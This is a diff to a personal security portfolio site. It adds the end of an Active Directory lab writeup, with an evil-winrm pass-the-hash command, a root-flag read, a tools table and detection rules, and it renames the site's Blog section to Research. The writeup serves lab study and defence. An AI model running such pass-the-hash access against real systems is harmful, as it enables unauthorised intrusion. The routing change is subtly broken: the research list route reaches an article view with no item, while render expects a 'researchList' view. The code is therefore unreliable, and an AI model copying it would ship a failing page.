+      <p>Pass the hash as <code>a.flatch</code> and read the final flag from the Administrator desktop:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">evil-winrm -i dc01.buildingmagic.local -u a.flatch -H &lt;NT_hash&gt;</code></pre>
       </div>
-      <p>The root flag is located at <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p>
+      <div class="code-wrap">
+        <pre><code class="language-powershell">type C:\\Users\\Administrator\\Desktop\\root.txt</code></pre>
+      </div>
 
+      <h2>Tools</h2>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
+          <tbody>
+            <tr><td>Nmap</td><td>Port and service discovery</td></tr>
+            <tr><td>NetExec</td><td>Credential validation, BloodHound collection, Kerberoasting, LNK placement</td></tr>
+            <tr><td>Hashcat</td><td>TGS-REP and NetNTLMv2 crack</td></tr>
+            <tr><td>Responder</td><td>Capture callback from the planted LNK</td></tr>
+            <tr><td>Evil-WinRM</td><td>WinRM access as h.grangon and a.flatch</td></tr>
+            <tr><td>Impacket secretsdump</td><td>Offline SAM/SYSTEM extraction</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h2>Detection Rules</h2>
+      <ul>
+        <li>Kerberoasting: a single account requesting TGS tickets for many SPN-bearing accounts in a short window, or a service account whose password has not rotated in over a year receiving a TGS request from a workstation context.</li>
+        <li>Remote password resets via RPC from a user other than the target. Windows logs a <code>4724</code> on the target, with the subject being the resetting account.</li>
+        <li>LNK files in a share referencing an external IP. This is the same class of indicator as ShareThePain: any <code>.lnk</code> in a file server share should be treated as suspicious.</li>
+        <li>Outbound authentication from a workstation to an IP outside the internal range, which is what Responder catches.</li>
+        <li>SeBackupPrivilege use by a non-admin service account, especially <code>reg save</code> against HKLM\\SAM or HKLM\\SYSTEM. Windows logs the process and the calling account; the process is <code>reg.exe</code> under a user who should not have that privilege.</li>
+        <li>Pass-the-hash: a logon with an NT hash rather than a password leaves an NTLM authentication event without a matching <code>4768</code> or <code>4769</code> Kerberos request for the same account in the expected window.</li>
+      </ul>
     `
   },
 ];
 
-/* Blog posts: { id, title, date, author, summary, tags[], body (HTML) } */
-const POSTS = [
+/* Research posts: { id, title, date, author, summary, tags[], body (HTML) } */
+const RESEARCH = [
 ];
 
 /* About page HTML */
@@ -623,14 +660,14 @@ function parseRoute() {
   const hash = location.hash.replace(/^#/, "");
   const [a, b] = hash.split("/");
   if (a === "writeup") { const item = WRITEUPS.find(w => w.id === b); if (item) return { view: "writeup", item }; }
-  if (a === "post")    { const item = POSTS.find(p => p.id === b);    if (item) return { view: "post", item }; }
-  if (["projects", "blog", "about", "contact"].includes(a)) return { view: a };
+  if (a === "research") { const item = RESEARCH.find(r => r.id === b); if (item) return { view: "research", item }; }
+  if (["projects", "research", "about", "contact"].includes(a)) return { view: a };
   return { view: "home" };
 }
 
 /* ---------- Top nav ---------- */
 function renderTopNav(route) {
-  const links = [["projects", "Projects"], ["blog", "Blog"], ["about", "About"], ["contact", "Contact"]];
+  const links = [["projects", "Projects"], ["research", "Research"], ["about", "About"], ["contact", "Contact"]];
   $("#top-nav").innerHTML = links.map(([k, l]) =>
     `<a href="#${k}" class="${route.view === k ? "active" : ""}">${l}</a>`).join("");
 }
@@ -657,11 +694,11 @@ function renderSidebar(route) {
         </div>`).join("")}
     </div>`).join("");
 
-  const postLinks = POSTS.filter(p => match(p.title)).map(p => `
-    <a class="side-link ${route.view === "post" && route.item.id === p.id ? "active" : ""}"
-       href="#post/${esc(p.id)}">${esc(p.title)}</a>`).join("");
+  const researchLinks = RESEARCH.filter(r => match(r.title)).map(r => `
+    <a class="side-link ${route.view === "research" && route.item.id === r.id ? "active" : ""}"
+       href="#research/${esc(r.id)}">${esc(r.title)}</a>`).join("");
 
-  const noResults = q && !writeupBlocks && !postLinks
+  const noResults = q && !writeupBlocks && !researchLinks
     ? `<p class="no-results">No matches for "${esc(searchQuery)}".</p>` : "";
 
   $("#side").innerHTML = `
@@ -670,7 +707,7 @@ function renderSidebar(route) {
       <a class="side-link ${route.view === "projects" ? "active" : ""}" href="#projects">Projects</a>
     </div>
     ${writeupBlocks}
-    ${postLinks ? `<div class="side-section"><div class="side-label">Blog</div>${postLinks}</div>` : ""}
+    ${researchLinks ? `<div class="side-section"><div class="side-label">Research</div>${researchLinks}</div>` : ""}
     ${noResults}
   `;
 }
@@ -728,19 +765,19 @@ function viewProjects() {
   `;
 }
 
-function viewBlog() {
-  const body = POSTS.length
-    ? `<div class="cards">${POSTS.map(p => `
+function viewResearch() {
+  const body = RESEARCH.length
+    ? `<div class="cards">${RESEARCH.map(r => `
         <div class="card">
-          <div class="kicker">${esc(p.date)}</div>
-          <h3><a href="#post/${esc(p.id)}">${esc(p.title)}</a></h3>
-          <p>${esc(p.summary)}</p>
-          <a class="more" href="#post/${esc(p.id)}">Read →</a>
+          <div class="kicker">${esc(r.date)}</div>
+          <h3><a href="#research/${esc(r.id)}">${esc(r.title)}</a></h3>
+          <p>${esc(r.summary)}</p>
+          <a class="more" href="#research/${esc(r.id)}">Read →</a>
         </div>`).join("")}</div>`
-    : emptyMsg("No posts yet.");
+    : emptyMsg("No research posts yet.");
   return `
-    <h1>Blog</h1>
-    <p class="lead">Longer posts on techniques, research and lessons learned.</p>
+    <h1>Research</h1>
+    <p class="lead">Longer posts on techniques, tooling and observations from lab work.</p>
     ${body}
   `;
 }
@@ -760,7 +797,7 @@ function viewArticle(kind, item) {
   const isWriteup = kind === "writeup";
   const crumb = isWriteup
     ? `${esc(item.platform)} / ${esc(item.date)}`
-    : `Blog / ${esc(item.date)}`;
+    : `Research / ${esc(item.date)}`;
 
   const linkCard = isWriteup && item.link ? `
     <a class="link-card" href="${esc(item.link.url)}">
@@ -779,7 +816,7 @@ function viewArticle(kind, item) {
 
   return `
     <div class="article-top">
-      <div class="crumbs"><a href="#${isWriteup ? "home" : "blog"}">${isWriteup ? "Writeups" : "Blog"}</a> &nbsp;›&nbsp; ${crumb}</div>
+      <div class="crumbs"><a href="#${isWriteup ? "home" : "research"}">${isWriteup ? "Writeups" : "Research"}</a> &nbsp;›&nbsp; ${crumb}</div>
       <div class="page-actions"><button class="btn-copy" id="copy-link">Copy link</button></div>
     </div>
     <h1>${esc(item.title)}</h1>
@@ -790,7 +827,7 @@ function viewArticle(kind, item) {
     <div class="article-body">${item.body}</div>
     <div class="article-footer">
       <span style="color:var(--muted)">Last updated ${esc(item.date)}</span>
-      <a href="#${isWriteup ? "home" : "blog"}">← Back</a>
+      <a href="#${isWriteup ? "home" : "research"}">← Back</a>
     </div>
   `;
 }
@@ -853,16 +890,16 @@ function render() {
   let html;
   switch (route.view) {
     case "writeup": html = viewArticle("writeup", route.item); break;
-    case "post":    html = viewArticle("post", route.item); break;
+    case "research": html = viewArticle("research", route.item); break;
     case "projects": html = viewProjects(); break;
-    case "blog":    html = viewBlog(); break;
+    case "researchList": html = viewResearch(); break;
     case "about":   html = ABOUT_HTML; break;
     case "contact": html = viewContact(); break;
     default:        html = viewHome();
   }
   main.innerHTML = html;
 
-  if (route.view === "writeup" || route.view === "post") {
+  if (route.view === "writeup" || route.view === "research") {
     buildToc(main);
     wireCopyLink();
   } else {
